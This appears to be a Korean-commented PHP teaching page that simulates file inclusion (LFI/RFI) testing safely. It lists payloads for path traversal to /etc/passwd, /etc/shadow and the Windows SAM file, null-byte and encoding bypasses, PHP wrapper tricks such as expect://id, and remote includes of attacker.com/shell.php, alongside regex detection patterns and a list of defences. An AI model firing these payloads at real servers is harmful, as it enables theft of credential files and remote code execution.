<?php
/**
 * File Inclusion (LFI/RFI) 테스트 페이지
 * PayloadsAllTheThings의 File Inclusion 페이로드를 기반으로 구성
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$error = '';
$file_path = $_POST['file_path'] ?? '';
$test_type = $_POST['test_type'] ?? 'lfi';

// File Inclusion 페이로드 모음 (PayloadsAllTheThings 기반)
$payloads = [
    'lfi_basic' => [
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/proc/version',
        '/proc/self/environ'
    ],
    'lfi_null_byte' => [
        '../etc/passwd%00',
        '../../etc/passwd%00',
        '../../../etc/passwd%00.txt',
        '/etc/passwd%00.php',
        '/etc/shadow%00.txt'
    ],
    'lfi_encoding' => [
        '../%2e%2e/etc/passwd',
        '..%2f..%2fetc%2fpasswd',
        '..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%afetc%c0%afpasswd',
        '..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd'
    ],
    'lfi_wrapper' => [
        'php://filter/read=convert.base64-encode/resource=../etc/passwd',
        'php://filter/convert.base64-encode/resource=config.php',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'expect://id',
        'input://<?php phpinfo(); ?>'
    ],
    'rfi_basic' => [
        'http://attacker.com/shell.txt',
        'https://attacker.com/shell.php',
        'ftp://attacker.com/shell.txt',
        'http://127.0.0.1/shell.php',
        'http://localhost/malicious.txt'
    ],
    'windows_lfi' => [
        '../windows/system32/drivers/etc/hosts',
        '../../windows/system32/drivers/etc/hosts',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\boot.ini',
        'C:\\windows\\win.ini',
        'C:\\windows\\system32\\config\\sam',
        'C:\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log'
    ]
];

// 안전한 파일 목록 (테스트용)
$safe_files = [
    'test.txt' => 'This is a test file content.',
    'sample.txt' => 'Sample file for testing purposes.',
    'info.txt' => 'Information file content.',
    'readme.txt' => 'README file content for testing.'
];

// 테스트 실행
if ($_POST && isset($_POST['file_path'])) {
    // 위험한 패턴 감지
    $dangerous_patterns = [
        '/\.\.\//',           // Directory traversal
        '/\/etc\//',          // System files
        '/\/proc\//',         // Process files
        '/\/sys\//',          // System files
        '/C:\\\\/',           // Windows system
        '/php:\/\//',         // PHP wrappers
        '/data:\/\//',        // Data URLs
        '/http:\/\//',        // Remote files
        '/https:\/\//',       // Remote files
        '/ftp:\/\//',         // FTP files
        '/%00/',              // Null byte
        '/\x00/'              // Null byte
    ];
    
    $is_dangerous = false;
    $detected_patterns = [];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $file_path)) {
            $is_dangerous = true;
            $detected_patterns[] = $pattern;
        }
    }
    
    if ($is_dangerous) {
        $result = "⚠️ 위험한 File Inclusion 패턴이 감지되었습니다!\n\n";
        $result .= "입력된 경로: " . htmlspecialchars($file_path) . "\n";
        $result .= "감지된 패턴: " . implode(', ', $detected_patterns) . "\n\n";
        $result .= "이러한 패턴들은 다음과 같은 공격에 사용될 수 있습니다:\n";
        $result .= "- Local File Inclusion (LFI): 서버의 민감한 파일 읽기\n";
        $result .= "- Remote File Inclusion (RFI): 외부 악성 파일 실행\n";
        $result .= "- Directory Traversal: 디렉토리 구조 탐색\n";
        $result .= "- Null Byte Injection: 파일 확장자 검증 우회\n\n";
        $result .= "실제 취약한 애플리케이션에서는 이로 인해 심각한 보안 문제가 발생할 수 있습니다.";
    } else {
        // 안전한 파일만 처리
        $clean_path = basename($file_path); // 경로 제거
        
        if (isset($safe_files[$clean_path])) {
            $result = "✅ 안전한 파일에 접근했습니다.\n\n";
            $result .= "파일명: " . htmlspecialchars($clean_path) . "\n";
            $result .= "내용:\n" . htmlspecialchars($safe_files[$clean_path]);
        } else {
            $result = "❌ 요청한 파일을 찾을 수 없습니다.\n\n";
            $result .= "사용 가능한 파일: " . implode(', ', array_keys($safe_files));
        }
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Inclusion 테스트 - 보안 테스트</title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .payload-section {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .payload-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 10px 0;
        }
        
        .payload-btn {
            background: #6c757d;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            max-width: 250px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .payload-btn:hover {
            background: #5a6268;
        }
        
        .payload-btn.dangerous {
            background: #dc3545;
        }
        
        .payload-btn.dangerous:hover {
            background: #c82333;
        }
        
        .test-form {
            background: white;
            border: 2px solid #dc3545;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .result-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #155724;
            font-family: monospace;
            white-space: pre-wrap;
        }
        
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #856404;
        }
        
        .danger-box {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #721c24;
        }
        
        .info-box {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #0c5460;
        }
        
        .safe-files {
            background: #d4edda;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
        }
        
        input[type="text"] {
            width: 100%;
            font-family: monospace;
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 10px;
        }
        
        .test-type-selector {
            margin: 15px 0;
        }
        
        .test-type-selector label {
            margin-right: 15px;
        }
        
        code {
            background: #f8f9fa;
            padding: 2px 4px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 -->
        <nav class="nav">
            <h1>File Inclusion (LFI/RFI) 테스트</h1>
            <div class="nav-links">
                <a href="index.php" class="btn">보안 테스트 메인</a>
                <a href="../index.php" class="btn">홈</a>
            </div>
        </nav>

        <!-- 브레드크럼 -->
        <nav class="breadcrumb">
            <a href="../index.php">홈</a> &gt; 
            <a href="index.php">보안 테스트</a> &gt; 
            <span>File Inclusion</span>
        </nav>

        <!-- 설명 -->
        <div class="info-box">
            <h3>📁 File Inclusion 테스트</h3>
            <p><strong>File Inclusion</strong>은 웹 애플리케이션이 사용자 입력을 통해 파일을 포함시킬 때 발생하는 취약점입니다.</p>
            <ul>
                <li><strong>LFI (Local File Inclusion):</strong> 서버의 로컬 파일에 접근</li>
                <li><strong>RFI (Remote File Inclusion):</strong> 외부 서버의 파일 실행</li>
            </ul>
            <p><strong>참고:</strong> 이 페이지에서는 실제 민감한 파일에 접근하지 않고 안전하게 시뮬레이션합니다.</p>
        </div>

        <!-- 경고 -->
        <div class="danger-box">
            <h3>⚠️ 심각한 보안 위험</h3>
            <p>File Inclusion 취약점은 다음과 같은 심각한 결과를 초래할 수 있습니다:</p>
            <ul>
                <li>민감한 시스템 파일 노출 (/etc/passwd, /etc/shadow 등)</li>
                <li>소스 코드 및 설정 파일 노출</li>
                <li>원격 코드 실행 (RFI의 경우)</li>
                <li>전체 시스템 권한 탈취</li>
            </ul>
        </div>

        <!-- Basic LFI -->
        <div class="payload-section">
            <h3>📂 Basic Local File Inclusion (LFI)</h3>
            <p>기본적인 디렉토리 순회를 통한 시스템 파일 접근 시도입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['lfi_basic'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'lfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars($p); ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Null Byte Injection -->
        <div class="payload-section">
            <h3>🔄 Null Byte Injection</h3>
            <p>널 바이트를 사용하여 파일 확장자 검증을 우회하는 기법입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['lfi_null_byte'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'lfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars($p); ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Encoding Bypass -->
        <div class="payload-section">
            <h3>🔤 URL Encoding Bypass</h3>
            <p>URL 인코딩을 사용하여 필터를 우회하는 기법입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['lfi_encoding'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'lfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 30)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- PHP Wrappers -->
        <div class="payload-section">
            <h3>🐘 PHP Wrapper Techniques</h3>
            <p>PHP의 스트림 래퍼를 악용한 고급 LFI 기법입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['lfi_wrapper'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'lfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 25)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Remote File Inclusion -->
        <div class="payload-section">
            <h3>🌐 Remote File Inclusion (RFI)</h3>
            <p>외부 서버의 악성 파일을 실행시키는 매우 위험한 공격입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['rfi_basic'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'rfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars($p); ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Windows LFI -->
        <div class="payload-section">
            <h3>🪟 Windows File Inclusion</h3>
            <p>Windows 환경에서의 파일 인클루전 페이로드입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['windows_lfi'] as $p): ?>
                    <button class="payload-btn dangerous" onclick="setPayload('<?php echo addslashes($p); ?>', 'lfi')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 30)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- 안전한 파일 목록 -->
        <div class="safe-files">
            <h3>✅ 테스트 가능한 안전한 파일</h3>
            <p>이 페이지에서는 실제 시스템 파일 대신 다음 테스트 파일들을 사용합니다:</p>
            <div class="payload-buttons">
                <?php foreach (array_keys($safe_files) as $file): ?>
                    <button class="payload-btn" onclick="setPayload('<?php echo $file; ?>', 'safe')" style="background: #28a745;">
                        <?php echo htmlspecialchars($file); ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- 테스트 폼 -->
        <form method="post" class="test-form">
            <h3>🧪 File Inclusion 테스트</h3>
            
            <div class="test-type-selector">
                <label><input type="radio" name="test_type" value="lfi" <?php echo $test_type === 'lfi' ? 'checked' : ''; ?>> Local File Inclusion (LFI)</label>
                <label><input type="radio" name="test_type" value="rfi" <?php echo $test_type === 'rfi' ? 'checked' : ''; ?>> Remote File Inclusion (RFI)</label>
            </div>
            
            <label for="file_path">파일 경로:</label>
            <input type="text" name="file_path" id="file_path" placeholder="예: ../etc/passwd 또는 test.txt" value="<?php echo htmlspecialchars($file_path); ?>">
            <br><br>
            <button type="submit" class="btn" style="background: #dc3545;">파일 포함 테스트</button>
        </form>

        <!-- 결과 표시 -->
        <?php if ($result): ?>
            <div class="result-box">
                <h3>📊 테스트 결과</h3>
                <?php echo $result; ?>
            </div>
        <?php endif; ?>

        <!-- 방어 방법 -->
        <div class="info-box">
            <h3>🛡️ File Inclusion 방어 방법</h3>
            <ul>
                <li><strong>화이트리스트 방식:</strong> 허용된 파일 목록만 사용</li>
                <li><strong>입력 검증:</strong> 사용자 입력에서 위험한 문자 필터링</li>
                <li><strong>경로 정규화:</strong> realpath() 등을 사용하여 경로 정규화</li>
                <li><strong>chroot jail:</strong> 파일 시스템 접근 제한</li>
                <li><strong>최소 권한 원칙:</strong> 웹 서버 권한 최소화</li>
                <li><strong>allow_url_include 비활성화:</strong> PHP 설정에서 원격 파일 포함 금지</li>
                <li><strong>open_basedir 설정:</strong> 접근 가능한 디렉토리 제한</li>
            </ul>
        </div>

        <!-- 위험한 패턴들 -->
        <div style="background: #f8d7da; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>⚠️ 위험한 패턴들</h3>
            <p>다음 패턴들은 File Inclusion 공격에 사용될 수 있습니다:</p>
            <ul>
                <li><code>../</code> - 디렉토리 순회</li>
                <li><code>/etc/passwd</code> - 시스템 사용자 정보</li>
                <li><code>/etc/shadow</code> - 암호 해시</li>
                <li><code>%00</code> - 널 바이트 인젝션</li>
                <li><code>php://</code> - PHP 래퍼</li>
                <li><code>data://</code> - 데이터 URL</li>
                <li><code>http://</code>, <code>https://</code> - 원격 파일</li>
            </ul>
        </div>

        <!-- 참고 자료 -->
        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>📚 참고 자료</h3>
            <ul>
                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">PayloadsAllTheThings - File Inclusion</a></li>
                <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank">OWASP - File Inclusion Testing</a></li>
                <li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank">PortSwigger - Directory Traversal</a></li>
                <li><a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank">CWE-98: PHP File Inclusion</a></li>
            </ul>
        </div>
    </div>

    <script>
        function setPayload(payload, testType) {
            document.getElementById('file_path').value = payload;
            if (testType) {
                document.querySelector(`input[value="${testType}"]`).checked = true;
            }
        }

        // 실시간 위험 패턴 감지
        document.getElementById('file_path').addEventListener('input', function() {
            const value = this.value;
            const dangerousPatterns = [
                /\.\.\//,          // Directory traversal
                /\/etc\//,         // System files
                /\/proc\//,        // Process files
                /C:\\/,            // Windows system
                /php:\/\//,        // PHP wrappers
                /data:\/\//,       // Data URLs
                /https?:\/\//,     // Remote files
                /%00/,             // Null byte
                /\x00/             // Null byte
            ];
            
            let isDangerous = false;
            for (let pattern of dangerousPatterns) {
                if (pattern.test(value)) {
                    isDangerous = true;
                    break;
                }
            }
            
            if (isDangerous) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#28a745';
                this.style.backgroundColor = '#f8fff8';
            }
        });

        // 폼 제출 시 확인
        document.querySelector('form').addEventListener('submit', function(e) {
            const filePath = document.getElementById('file_path').value;
            const dangerousPatterns = [
                /\.\.\//,
                /\/etc\//,
                /\/proc\//,
                /C:\\/,
                /php:\/\//,
                /data:\/\//,
                /https?:\/\//,
                /%00/,
                /\x00/
            ];
            
            let isDangerous = false;
            for (let pattern of dangerousPatterns) {
                if (pattern.test(filePath)) {
                    isDangerous = true;
                    break;
                }
            }
            
            if (isDangerous) {
                const confirmed = confirm(
                    '입력된 경로에 위험한 패턴이 포함되어 있습니다.\n' +
                    '이는 File Inclusion 공격에 사용될 수 있습니다.\n\n' +
                    '교육 목적으로 계속 진행하시겠습니까?'
                );
                
                if (!confirmed) {
                    e.preventDefault();
                }
            } else {
                const confirmed = confirm(
                    'File Inclusion 테스트를 실행하시겠습니까?\n' +
                    '이 테스트는 교육 목적으로만 사용하세요.'
                );
                
                if (!confirmed) {
                    e.preventDefault();
                }
            }
        });
    </script>
</body>
</html>